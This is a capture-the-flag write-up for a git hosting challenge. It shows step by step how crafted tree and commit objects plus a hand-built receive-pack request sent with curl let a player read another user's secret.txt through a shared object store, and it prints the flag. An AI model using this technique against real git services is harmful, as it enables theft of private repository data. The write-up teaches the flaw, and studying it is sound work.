The service allows you to create a git repo, pull from it, and push to it. Examining the source, it appears to keep all of the git objects under the same namespace, and only keeps track of named refs (e.g. HEAD) on a repo-by-repo basis.

The image shows someone pushing a commit including a file named secret.txt with an object-hash of 4f9486f4498bc353b1e9a3ac790993eea4229f2e. If we can convince the server to accept a push refering to this object-hash, when we perform a pull later, we should be able to get its contents!

Git makes it easy to create the necessary commit/tree objects to make this happen (Git Internals is a great reference for this). From a cloned repo:

$ git update-index --add --cacheinfo 100644 4f9486f4498bc353b1e9a3ac790993eea4229f2e secret.txt
$ TREE=$(git write-tree --missing-ok)
$ COMMIT=$(echo "add secret.txt" | git commit-tree $TREE)
Now, our local git repo contains two new objects: $TREE is a git tree object that refers to the secret.txt uploaded by the person in the photo, and $COMMIT is a git commit object that refers to $TREE. Now, we just need to push these new objects to the remote repo, and update refs/heads/master to point to $COMMIT. Usually, we would just do a git push to do this, but git push refuses to push objects that refer to objects that we don’t have cached locally.

Instead, we will go behind git’s back and perform the push HTTP request manually. Luckily, the push protocol is pretty simple: an HTTP POST with a payload of a list of length-prefixed strings containing instructions to update remote refs, terminated by an entry of length 0, followed by a “git pack” blob containing a set of serialized, compressed git objects. First, let’s make that git pack, containing just our commit and tree objects:

$ (echo $TREE; echo $COMMIT) | git pack-objects --stdout > pack
Next, create the prefix that points the remote HEAD at our new commit, and fire off the request:

$ echo -n "00670000000000000000000000000000000000000000 $COMMIT refs/heads/master0000" > update-ref
$ cat update-ref pack > payload
$ curl --data-binary @payload -H "Content-type: application/x-git-receive-pack-request" $URL/git-receive-pack -i
Now, the remote repo should contain the secret.txt we’re looking for. Do a git pull and retrieve the flag!

$ git pull
$ cat secret.txt
SIGINT_preimage_is_easy_8547262aeafbc450
